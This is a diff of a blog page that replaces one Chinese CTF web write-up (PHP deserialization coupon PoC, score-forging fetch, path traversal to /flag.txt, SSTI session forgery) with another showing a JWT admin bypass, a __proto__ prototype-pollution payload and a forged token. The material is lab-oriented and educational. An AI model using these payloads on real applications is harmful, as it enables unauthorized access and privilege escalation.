@@ -19,24 +19,24 @@
   <meta name="author" content="AzumiSaki">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前言这个比赛怎么说呢。。。有点恶心，pwn题环境一直是崩的打不开，web题简单的要命，misc题净出些老题，只能说拉完了 WEB-PHP_Payment开题，首先看到是一个购物界面，经典逻辑漏洞题，题目又说道要用base64的形式传参获得优惠券来增长余额，所以先看到题目附件，发现存在php反序列化接口  随后跳转到moudle.php，可以看到，先是创建了一个PromoManager对象，然后再_">
+    <meta name="description" content="开题分析首先题目附件给了一个app.json，先分析查找可利用的代码 先看到验证登录段 123456789101112function Check(token)&#123;    if(!token)&#123;        res.redirect(&#x27;&#x2F;login&#x27;);    &#125;    const data &#x3D; jwt.decode(token);">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2026御网杯-web全解">
-<meta property="og:url" content="https://azumisaki.github.io/2026/05/31/yuwangbei/index.html">
+<meta property="og:title" content="0xgame2025-Week3 Web-长月夜 wp以及对于js原型链污染的又一次学习">
+<meta property="og:url" content="https://azumisaki.github.io/2026/05/31/%E9%95%BF%E6%9C%88%E5%A4%9C/index.html">
 <meta property="og:site_name" content="Saki的博客">
-<meta property="og:description" content="前言这个比赛怎么说呢。。。有点恶心，pwn题环境一直是崩的打不开，web题简单的要命，misc题净出些老题，只能说拉完了 WEB-PHP_Payment开题，首先看到是一个购物界面，经典逻辑漏洞题，题目又说道要用base64的形式传参获得优惠券来增长余额，所以先看到题目附件，发现存在php反序列化接口  随后跳转到moudle.php，可以看到，先是创建了一个PromoManager对象，然后再_">
+<meta property="og:description" content="开题分析首先题目附件给了一个app.json，先分析查找可利用的代码 先看到验证登录段 123456789101112function Check(token)&#123;    if(!token)&#123;        res.redirect(&#x27;&#x2F;login&#x27;);    &#125;    const data &#x3D; jwt.decode(token);">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://azumisaki.github.io/img/12.jpg">
-<meta property="article:published_time" content="2026-05-31T00:45:55.000Z">
-<meta property="article:modified_time" content="2026-05-31T01:53:45.055Z">
+<meta property="og:image" content="https://azumisaki.github.io/img/13.jpeg">
+<meta property="article:published_time" content="2026-05-31T14:39:54.000Z">
+<meta property="article:modified_time" content="2026-05-31T14:27:19.174Z">
 <meta property="article:author" content="AzumiSaki">
-<meta property="article:tag" content="wp&#x2F;sum">
+<meta property="article:tag" content="-js原型链污染">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://azumisaki.github.io/img/12.jpg">
+<meta name="twitter:image" content="https://azumisaki.github.io/img/13.jpeg">
   
   
   
-  <title>2026御网杯-web全解 - Saki的博客</title>
+  <title>0xgame2025-Week3 Web-长月夜 wp以及对于js原型链污染的又一次学习 - Saki的博客</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -211,13 +211,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img/12.jpg') no-repeat center center; background-size: cover;">
+     style="background: url('/img/13.jpeg') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="2026御网杯-web全解"></span>
+            <span id="subtitle" data-typed-text="0xgame2025-Week3 Web-长月夜 wp以及对于js原型链污染的又一次学习"></span>
           
         </div>
 
@@ -228,8 +228,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-05-31 08:45" pubdate>
-          2026年5月31日 早上
+        <time datetime="2026-05-31 22:39" pubdate>
+          2026年5月31日 晚上
         </time>
       </span>
     
@@ -240,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          482 字
+          414 字
         
       </span>
     
@@ -251,7 +251,7 @@
         
         
         
-          5 分钟
+          4 分钟
         
       </span>
     
@@ -292,12 +292,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">2026御网杯-web全解</h1>
+            <h1 id="seo-header">0xgame2025-Week3 Web-长月夜 wp以及对于js原型链污染的又一次学习</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2026年5月31日 上午
+                    本文最后更新于 2026年5月31日 晚上
                   
                 
               </p>
@@ -305,35 +305,35 @@
             
               <div class="markdown-body">
                 
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛怎么说呢。。。有点恶心，pwn题环境一直是崩的打不开，web题简单的要命，misc题净出些老题，只能说拉完了</p>
-<h2 id="WEB-PHP-Payment"><a href="#WEB-PHP-Payment" class="headerlink" title="WEB-PHP_Payment"></a>WEB-PHP_Payment</h2><p>开题，首先看到是一个购物界面，经典逻辑漏洞题，题目又说道要用base64的形式传参获得优惠券来增长余额，所以先看到题目附件，发现存在php反序列化接口</p>
-<p><img src="/img/yuwangbei/1.png" srcset="/img/loading.gif" lazyload></p>
-<p>随后跳转到moudle.php，可以看到，先是创建了一个PromoManager对象，然后再__construct调用传入设定好的余额</p>
-<p><img src="/img/yuwangbei/2.png" srcset="/img/loading.gif" lazyload></p>
-<p>链子很简单，unserialize()-&gt;PromoManager对象生成-&gt;promo_credit-&gt;__destruct()</p>
-<p>搓一个简单的poc</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PromoManager</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$promo_credit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$promo_code</span>;<br>&#125;<br><br><span class="hljs-variable">$promo</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PromoManager</span>();<br><span class="hljs-variable">$promo</span>-&gt;promo_credit=<span class="hljs-number">100000</span>;<br><span class="hljs-variable">$promo</span>-&gt;promo_code=<span class="hljs-string">&quot;pwn!&quot;</span>;<br><span class="hljs-variable">$serialized</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$promo</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$serialized</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+                <h2 id="开题分析"><a href="#开题分析" class="headerlink" title="开题分析"></a>开题分析</h2><p>首先题目附件给了一个app.json，先分析查找可利用的代码</p>
+<p>先看到验证登录段</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json">function Check(token)<span class="hljs-punctuation">&#123;</span><br>    if(!token)<span class="hljs-punctuation">&#123;</span><br>        res.redirect(&#x27;/login&#x27;);<br>    <span class="hljs-punctuation">&#125;</span><br>    const data = jwt.decode(token);<br>    <br>    if(data.username === <span class="hljs-string">&quot;admin&quot;</span>)<span class="hljs-punctuation">&#123;</span><br>        return <span class="hljs-literal"><span class="hljs-keyword">true</span></span>;<br>    <span class="hljs-punctuation">&#125;</span> else<span class="hljs-punctuation">&#123;</span><br>        return <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;<br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/yuwangbei/3.png" srcset="/img/loading.gif" lazyload></p>
-<p>base64转码后上传买flag就可以了</p>
-<p>但是这里有一个小坑，购买flag的时候得抓相应包里的flag，因为代码是这样写的（</p>
-<p><img src="/img/yuwangbei/4.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="WEB-Snake-Game"><a href="#WEB-Snake-Game" class="headerlink" title="WEB-Snake_Game"></a>WEB-Snake_Game</h2><p>典中典，前端js逆向，来看到这串代码：</p>
-<p><img src="/img/yuwangbei/5.png" srcset="/img/loading.gif" lazyload></p>
-<p>发现可以通过创建一个新的index对象修改score来快速改分数</p>
-<p>于是构造</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> fd=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();<br>fd.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;score&#x27;</span>,<span class="hljs-number">300</span>);<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>,&#123;<span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-attr">body</span>:fd&#125;)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.<span class="hljs-title function_">json</span>())<br>.<span class="hljs-title function_">then</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>);<br></code></pre></td></tr></table></figure>
+<p>再结合后面这一段check</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json">function Admin_Check(req<span class="hljs-punctuation">,</span> res<span class="hljs-punctuation">,</span> next)<span class="hljs-punctuation">&#123;</span><br>    const token = req.cookies.token || req.headers.authorization?.split(&#x27; &#x27;)<span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span>;<br>    <br>    if(!token)<span class="hljs-punctuation">&#123;</span><br>        return res.redirect(&#x27;/login&#x27;<span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span>message<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Need Login!&quot;</span><span class="hljs-punctuation">&#125;</span>);<br>    <span class="hljs-punctuation">&#125;</span><br>    try<span class="hljs-punctuation">&#123;</span><br>        const data = jwt.decode(token);<br>        if(data.username === &#x27;admin&#x27;)<span class="hljs-punctuation">&#123;</span><br>            return next();<br>        <span class="hljs-punctuation">&#125;</span> else<span class="hljs-punctuation">&#123;</span><br>            return res.redirect(&#x27;/trailblazer&#x27;);<br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span> catch (err)<span class="hljs-punctuation">&#123;</span><br>        return res.redirect(&#x27;/login&#x27;);<br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p>输入到前端console后拿到flag</p>
-<p><img src="/img/yuwangbei/6.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="Web-oa运维系统"><a href="#Web-oa运维系统" class="headerlink" title="Web-oa运维系统"></a>Web-oa运维系统</h2><p>​	神人比赛结束后不给环境复现，就谈谈个人思路	</p>
-<p>​	首先看到有一个?moudle&#x3D;，且题目提示可以目录穿越，当我们访问“关于”页面的时候就会请求&#x2F;?module&#x3D;about.php</p>
-<p>所以可以爆字典请求&#x2F;?module&#x3D;&#x2F;flag.txt即可拿到flag</p>
-<h2 id="Web-ssti"><a href="#Web-ssti" class="headerlink" title="Web-ssti"></a>Web-ssti</h2><p>​	首先现在附件的初始化数据库脚本中拿到默登录的管理员账号密码（环境又关了）</p>
-<p><img src="/img/yuwangbei/7.png" srcset="/img/loading.gif" lazyload></p>
-<p>​	然后再fenjing一把梭：{“profile_id”:1,”data”:{“state”:”AUDIT_PENDING”,”income”:0,”deductions”:0,”custom_footer”:”“}}</p>
-<p>拿到密钥secret_tax_key_2026_xoxo</p>
-<p>随后伪造管理员登录session后登进系统里进入金库界面拿到flag</p>
+<p>可以发现存在jwt密钥伪造漏洞，且题目没有对session做任何验证手段，这也就意味着我们只需更改session里面的role即可以管理员的身份登录</p>
+<p>再接着往下看</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json">app.post(&#x27;/admin_club1st&#x27;<span class="hljs-punctuation">,</span> Admin_Check<span class="hljs-punctuation">,</span> (req<span class="hljs-punctuation">,</span> res) =&gt; <span class="hljs-punctuation">&#123;</span><br>    let body = req.body;<br>    let evernight = Object.create(CONFIG);<br>    let min_public_time = CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time;<br>    merge(evernight<span class="hljs-punctuation">,</span> body);    <br>    let en = Object.create(CONFIG);<br><br>    if (en.min_public_time &lt; <span class="hljs-string">&quot;2025-08-03&quot;</span>) <span class="hljs-punctuation">&#123;</span><br>        return res.render(&#x27;march7th&#x27;<span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span>message<span class="hljs-punctuation">:</span> FLAG<span class="hljs-punctuation">&#125;</span>);<br>    <span class="hljs-punctuation">&#125;</span><br><br>    return res.render(&#x27;evernight&#x27;);<br><span class="hljs-punctuation">&#125;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>可以发现当min_public_time小于2025-08-03时会回显flag，所以也很清楚了。当访问&#x2F;admin_club1st时，会检测min_public_time并继承自merge函数里的body和everynight</p>
+<p>所以也很明显了，js原型链污染漏洞成立，所以尝试一下简单的payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;min_public_time&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2024-08-03&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span> 			<span class="hljs-comment">//随便改，小于即可</span><br></code></pre></td></tr></table></figure>
+
+<p>于是整条攻击链就出来了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ABAP">随便注册一个账户-&gt;拿/改session-&gt;登录管理员身份-&gt;拿flag<br></code></pre></td></tr></table></figure>
+
+<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>先随便注册一个账号并登录拿到session</p>
+<p><img src="/img/%E9%95%BF%E6%9C%88%E5%A4%9C/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后修改session：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJpYXQiOjE3ODAyMzUxNjcsImV4cCI6MTc4MDI3MTE2N30.OA1FNdAv4fEbPdHuaz43jO4s-j1yuRPfEKPRHNeZSYM<br></code></pre></td></tr></table></figure>
+
+<p>登录&#x2F;admin_club1st</p>
+<p><img src="/img/%E9%95%BF%E6%9C%88%E5%A4%9C/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>记得改POST和json格式</p>
+<p>拿到flag</p>
+<p><img src="/img/%E9%95%BF%E6%9C%88%E5%A4%9C/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>0xGame{Back_to_Earth_in_Evernight}</p>
 
                 
               </div>
@@ -352,7 +352,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E8%B5%9B%E5%90%8Ewp/" class="category-chain-item">赛后wp</a>
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
   
   
 
@@ -367,7 +367,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/wp-sum/" class="print-no-link">#wp/sum</a>
+        <a href="/tags/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="print-no-link">#-js原型链污染</a>
       
     </div>
   
@@ -379,8 +379,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>2026御网杯-web全解</div>
-      <div>https://azumisaki.github.io/2026/05/31/yuwangbei/</div>
+      <div>0xgame2025-Week3 Web-长月夜 wp以及对于js原型链污染的又一次学习</div>
+      <div>https://azumisaki.github.io/2026/05/31/长月夜/</div>
     </div>
     <div class="license-meta">
       
@@ -424,18 +424,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/05/31/changyueye/" title="changyueye">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">changyueye</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/04/28/Linux/" title="Linux">
-                        <span class="hidden-mobile">Linux</span>
+                      <a href="/2026/05/31/changyueye/" title="changyueye">
+                        <span class="hidden-mobile">changyueye</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
